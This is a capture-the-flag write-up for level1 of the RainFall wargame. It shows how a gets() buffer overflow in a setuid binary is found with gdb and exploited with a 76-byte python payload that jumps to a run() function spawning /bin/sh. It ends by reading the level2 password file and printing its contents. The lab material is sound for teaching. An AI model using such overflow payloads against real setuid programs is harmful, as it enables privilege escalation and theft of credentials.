level1
======

*	We spawn with a [level1](source/level1) executable
	```console
	level1@RainFall:~$ ls -l
	total 732
	level1@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
	level1@RainFall:~$ ./level1
	█
	level1@RainFall:~$ ./level1 test
	█
	```
*	So we get an endless loop here, let's do as usual
	```console
	root@DESKTOP-69N2SL4:~# scp -P 4242 level1@192.168.29.4:~/level1 .
	root@DESKTOP-69N2SL4:~# ./getFunctions.sh
	```
*	When we take a look at the main it looks like I was wrong, the code use the function `gets()` which led me to think that the program is reading the input (My mistake here, I should've at least tried to add something)
*	We also have another function called `run()`, this one uses `fwrite()`.
*	Looking deeper into gdb, we can see that it takes $eax=`("Good... Wait what?\n")` and then it calls `system()` to execute `/bin/sh`
*	So, now we are dealing with a [Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/)
*	Here we can see the buffer is sized `80` bytes
	```assembly
	sub    $0x50,%esp
	```
*	Instead of using python I made a little [program](source/randomStr.sh) in shell to get a random string of `x` char
	```console
	level1@RainFall:~$ echo str > /tmp/exlpoit
	```
*	Since this program is more of a buffer *over-READ* issue, we need to put our exploit in a file instead of doing it on the terminal directly
	```console
	level1@RainFall:~$ gdb ./level1
	(gdb) r < /tmp/exploit
	Starting program: /home/user/level1/level1 < /tmp/exploit

	Program received signal SIGSEGV, Segmentation fault.
	0x63413563 in ?? ()
	```
*	I found this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to get calculate the offset and it is `76`
*	Our exploit will be the usgin the run function.
	```assembly
	08048444 <run>:
	```
*	In many modern systems, including Intel x86 and x86_64 architectures, little-endian is the prevalent byte order. So we add `\x44\x84\x04\x08` in the end of the exploit.
*	Let's try this, this time I use python to make this more readable:
	```console
	level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
	level1@RainFall:~$ cat /tmp/exploit | ./level1 
	Good... Wait what?
	Segmentation fault (core dumped)
	```
	Make sure to use `echo -e` if you don't use python print because the memory part won't be interpreted as binary data.
*	The issue here is that the `/bin/sh` will shutdown because it is trying to read `STDIN`. We have to make sure cat, there is many ways to make sure it keeps reading 
	```console
	level1@RainFall:~$ (cat /tmp/exploit; cat) | ./level1
	level1@RainFall:~$ cat /tmp/exploit - | ./level1
	Good... Wait what?
	whoami
	level2
	cat /home/user/level2/.pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	```